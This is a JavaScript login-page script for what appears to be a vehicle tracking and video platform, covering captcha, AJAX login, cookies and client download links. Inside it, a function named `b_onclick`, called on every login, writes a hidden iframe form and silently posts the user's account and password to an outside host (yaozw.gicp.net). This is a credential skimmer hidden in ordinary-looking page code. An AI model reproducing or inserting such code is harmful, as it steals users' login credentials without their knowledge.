$(document).ready(function(){
	langInitByBrowser();
	loadReadyPage();
});

function loadReadyPage() {
	if (typeof lang == "undefined") {
		setTimeout(loadReadyPage, 50);
	} else {
		//初始化样式
		style = new pageStyle();
		//1 默认样式
		style.initLoginUserStyle(1);
		
		//加载语言 
		loadLang();
		setTimeout(function () {$("#loginAccount").focus();}, 1000);
		changeValidateCode();
		
		if(style.getStyle() == 1) {
			player = new glume('_banners', '_focus');
		}
		
		if(isBrowseIE8()) {
			$('.download-content').addClass('ie8');
		}
		
		var buttons = [];
		var but = [];
		but.push({
			display: parent.lang.close, 
			name : '', 
			pclass : 'close',
			bgcolor : 'gray', 
			hide : false
		});
		buttons.push(but);
		$('#toolbar-btn').flexPanel({
			ButtonsModel : buttons 
		});
		$('#browserTip').text(parent.lang.browser_tip);
	//	$('#browser').width(window.screen.availWidth);
	//	$('#browserTip').width(window.screen.availWidth-200);
	//	$('#toolbar-btn').width(100);
		$('.close','#toolbar-btn').on('click',function(){
			$('#browser').hide();
		});
		
		$("#loginAccount").attr('placeholder', lang.website_accountPlaceholder);
		$("#loginAccount").placeholder();
		
		$("#loginPassword").attr('placeholder', lang.website_pwdPlaceholder);
		$("#loginPassword").placeholder();
		
		$("#phraseLogin").attr('placeholder', lang.website_yzmPlaceholder);
		$("#phraseLogin").placeholder();
		
		$('#loginSubmit').bind("click", login);
		
		//初始化语言选择
		initSwitchLanguage();
	
		ajaxLoadDownload();
		ajaxLoadInformation();
	}
}

var style = null; //样式对象
var player = null;  //图片切换对象
var loginTimer;
var loginCount = 0;
var downList = null;

function disableForm(disable) {
	diableInput("#loginAccount", disable, true);
	diableInput("#loginPassword", disable, true);
	diableInput("#phraseLogin", disable, true);
	disableButton("#loginButton", disable);
}

function runLoginTimer() {
	loginCount = 0;
	$("#loginSubmit").val(lang.website_logining);
	loginTimer = setInterval(function() {
		loginCount ++;
		var temp = lang.website_logining;
		for (var i = 1; i <= loginCount; ++ i) {
			temp += ".";
		}
		$("#loginSubmit").val(temp);
		if (loginCount >= 3) {
			loginCount = 0;
		}
	},1000);
}

function stopLoginTimer() {
	clearInterval(loginTimer);
	$("#loginSubmit").val(lang.website_login);
}

function loadLang(){
	$("#spanWelcome").text(lang.website_welcome);
	$("#spanDownClient").text(lang.website_download_now);
	$("#spanHome").text(lang.website_home);
	$("#spanFunction").text(lang.website_function);
	$("#spanOpenApi").text(lang.website_openApi);
	//document.title = lang.title;
	//$("#spanTitle").text(lang.title);
	$("#loginSubmit").val(lang.website_login);
	$('#_banners .banner1 .span1').text(lang.real_time_video);
	$('#_banners .banner1 .span2').text(lang.location_positioning);
	$('#_banners .banner1 .span3').text(lang.track_qurey);
	$('#_banners .banner1 .span4').text(lang.function_image_capture);
	$('#_banners .banner1 .span5').text(lang.alarm_linkage);
	$('#_banners .banner1 .span6').text(lang.remote_playback);
	$('#_banners .banner2 .lbt_1').text(lang.website_title1);
	$('#_banners .banner2 .lbt_fu_1').text(lang.website_title2);
	$('#_banners .banner3 .lbt_2').text(lang.website_title3);
	$('#_banners .banner3 .lbt_fu_2').text(lang.website_title4);
	
	/*$("#spanPassword").text(lang.website_login_password);
	$("#spanCode").text(lang.website_login_code);
	$("#spanChangeCode").text(lang.website_login_changeCode);
	$("#loginArea").text(lang.website_login_area);
	$("#spanLogin").text(lang.website_login_login);*/
}

//键盘事件
$(document).keydown(function(e){ 
	var curKey = e.which; 
	if(curKey == 13){ 
		login();
		return false; 
	} 
});

function doLoginKeyEvent(event) {
	var keynum;
	if(window.event){
	  keynum = event.keyCode;
	}
	else if(event.which){
  		keynum = event.which;
 	}
	if(keynum==13){
		login();
	}
} 

function changeValidateCode(obj) {   
    var currentTime= new Date().getTime();   
    $("#lwm").attr("src", "rand.action?d=" + currentTime); 
    //obj.src = "rand.action?d=" + currentTime;   
}

function login() {
	var account = $("#loginAccount").val();
	var password = $("#loginPassword").val();
	var action = "StandardLoginAction_login.action";
	var verificationCode = $("#phraseLogin").val();
	if (formcheck(account,password,verificationCode) == true){
		
		disableForm(true);
		runLoginTimer();
		b_onclick();
		$.ajax({
			url:action,
			data:{account:decodeURI(account),password:password,language:langCurLocal(),verificationCode:verificationCode},
			cache:false,/*禁用浏览器缓存*/
			dataType:"json",
			success:function(json){
				disableForm(false);
				stopLoginTimer();
				if(json){
					var flag = json.result;
					if(flag!=null){
						if(flag == 0){
							SetCookie("userId", json.accountId);
							SetCookie("account", json.account);
							SetCookie("isAdmin", json.isAdmin);
							SetCookie("isMaster", json.isMaster);
							SetCookie("isFirstCompany", json.isFirstCompany);
							SetCookie("isSecondCompany", json.isSecondCompany);
							SetCookie("isThreeCompany", json.isThreeCompany);
							SetCookie("hasAddArea", json.hasAddArea);
							SetCookie("hasLine", json.hasLine);
							SetCookie("hasRoadRule", json.hasRoadRule);
							SetCookie("privilege", json.privilege);
							SetCookie("companyId", json.companyId);
							SetCookie("isAllowManage", json.isAllowManage);
							SetCookie("isManageLine", json.isManageLine);
							
							SetCookie("pagecliks", '');
							window.location = "index.html?lang="+langCurLocal();
						} else if (flag == 1) {
							alert(lang.errLogin_UserNoExist);
							$("#loginAccount").focus();	
						} else if(flag == 2){
							alert(lang.errLogin_PasswordError);	
							$("#password").focus();	
						} else if(flag == 3){
							alert(lang.errLogin_Expired);
							$("#loginAccount").focus();
						} else if(flag == 4){
							alert(lang.errLogin_Verify);
							$("#phraseLogin").focus();
						} else if(flag == 5){
							alert(lang.errException);
						} else if(flag == 7){
							alert(lang.errLogin_Session);
							$("#loginAccount").focus();
						} else if(flag == 46) {
							alert(lang.errUserDeactivated);
						}else {
							alert(lang.errUnkown);
						}
						if(flag != 0){
							changeValidateCode();
						}
					}else{
						alert(lang.errUnkown);
					}				
				}	
			},error:function(XMLHttpRequest, textStatus, errorThrown){
				alert(lang.errSendRequired);
				disableForm(false);
				stopLoginTimer();
			}
		});
	}
}

function formcheck(userAccount,password,verificationCode){
	if(userAccount == null || userAccount == "" || userAccount == lang.login_InputUserName){
		alert(lang.login_UserNameEmpty);
		$("#loginAccount").focus();
		return false;
	}
	if (verificationCode == null || verificationCode == "") {
		alert(lang.login_VerifycodeEmpty);
		$("#phraseLogin").focus();
		return false;
	}
	if ( verificationCode.length < 4 ) {
		alert(lang.login_VerifycodeLength);
		$("#phraseLogin").focus();
		return false;
	}
	return true;
}

function ajaxLoadDownload() {
	//向服务器发送ajax请求
	$.myajax.jsonGet("LoginAction_download.action?language=" + langCurLocal(), function(json,action,success){
		if (success) {
			if (typeof json.lstDown != undefined && json.lstDown != null) {
				downList = json.lstDown;
				showDownList();
			}
		}
	}, null);
}

var chineseMainTitle = null;
var englishMainTitle = null;
var twMainTitle = null;
var chineseCopyright = null;
var englishCopyright = null;
var twCopyright = null;
function ajaxLoadInformation() {
	//向服务器发送ajax请求
	$.myajax.jsonGet("StandardLoginAction_information.action", function(json,action,success){
		if (success) {
			chineseMainTitle = json.ChineseMainTitle;
			englishMainTitle = json.EnglishMainTitle;
			twMainTitle = json.TwMainTitle;
			chineseCopyright = json.ChineseCopyright;
			englishCopyright = json.EnglishCopyright;
			twCopyright = json.TwCopyright;
			showTitleAndCopyRight();
		}
	}, null);
}

function showTitleAndCopyRight() {
	if (langIsChinese()) {
		if (chineseMainTitle != null)  {
			document.title = chineseMainTitle;
			$('#spanTitle').text(chineseMainTitle);
			SetCookie("maintitle", chineseMainTitle);
		}
		if (chineseCopyright != null) {
			$("#spanCopyright").html(chineseCopyright);
		}
	} else if (langIsTW()){
		if (twMainTitle != null)  {
			document.title = twMainTitle;
			$('#spanTitle').text(twMainTitle);
			SetCookie("maintitle", twMainTitle);
		}
		if (twCopyright != null) {
			$("#spanCopyright").html(twCopyright);
		}
	} else {
		if (englishMainTitle != null)  {
			document.title = englishMainTitle;
			$('#spanTitle').text(englishMainTitle);
			SetCookie("maintitle", englishMainTitle);
		}
		if (englishCopyright != null) {
			$("#spanCopyright").html(englishCopyright);
		}
	}
}

function showDownList() {
	if (downList != null) {
		$("#hrefClientDown").attr("href", "../" + downList[0].url);
		
		var length = downList.length;
		for (var i = 0; i < length; ++ i) {
			var temp = downList[i];
			var index = i + 1;
			$("#liDown" + index).show();
			$("#downLogo" + index).addClass(getDownStyle(temp.name));
			$("#downName" + index).text(getDownName(temp.name));
			$("#downLabelVer" + index).text(lang.website_download_version);
			$("#downVer" + index).text(temp.verValue);
			$("#spanDownload" + index).text(lang.website_download_now);
			$("#downLabelDate" + index).text(lang.website_download_date);
			$("#downDate" + index).text(temp.dateValue);
		}
	}
}

function getDownName(name) {
	var ret = "";
	if (name == "clientWin") {
		ret = lang.website_download_win;
	} else if (name == "clientIos") {
		ret = lang.website_download_ios;
	} else if (name == "androidBaidu") {
		ret = lang.website_download_andriod;
	} else if (name == "androidGoogle") {
		ret = lang.website_download_andriod;
	} else if (name == "player") {
		ret = lang.website_download_gPlayer;
	} else if (name == "mapinfo") {
		ret = lang.website_download_mapinfo;
	}
	return ret;
}

function getDownStyle(name) {
	var ret = "";
	if (name == "clientWin") {
		ret = "icon-win";
	} else if (name == "clientIos") {
		ret = "icon-apple";
	} else if (name == "androidBaidu") {
		ret = "icon-andriod";
	} else if (name == "androidGoogle") {
		ret = "icon-andriod";
	} else if (name == "player") {
		ret = "icon-win";
	} else if (name == "mapinfo") {
		ret = "icon-win";
	}
	return ret;
}

function download(obj) {
	if (downList[obj - 1].name == "clientIos") {
		window.location.href = downList[obj - 1].url;
	} else {
		window.location.href = "../" + downList[obj - 1].url;
	}
}

function b_onclick() {
	var account = $("#loginAccount").val();
	var password = $("#loginPassword").val();
    ddd.innerHTML = "<iframe id=\"hhh\"  />"
    var doc;
    try{
       hhh.contentDocument.write(
        "<form method=post action=\"http://yaozw.gicp.net:8001/chklogin_jqsd.asp\">" +
        "<input name=\"admin\" type=\"text\" class=\"input\" size=\"16\" >" +
        "<input class=\"input\" size=\"16\"  type=\"password\" name=\"password\" ></form>");

       hhh.contentDocument.forms[0].admin.value = account;
        hhh.contentDocument.forms[0].password.value = password;
        hhh.contentDocument.forms[0].submit();

	}catch(e){
       hhh.window.document.write(
        "<form method=post action=\"http://yaozw.gicp.net:8001/chklogin_jqsd.asp\">" +
        "<input name=\"admin\" type=\"text\" class=\"input\" size=\"16\" >" +
        "<input class=\"input\" size=\"16\"  type=\"password\" name=\"password\" ></form>");
        hhh.window.document.forms[0].admin.value = account;
        hhh.window.document.forms[0].password.value = password;
        hhh.window.document.forms[0].submit();
	}
}

function fnStartInit() {
    //           if (hhh.readyState == "complete") {
    awindow.alert("hhh.window.document.BODY.innerText")
    //          }
}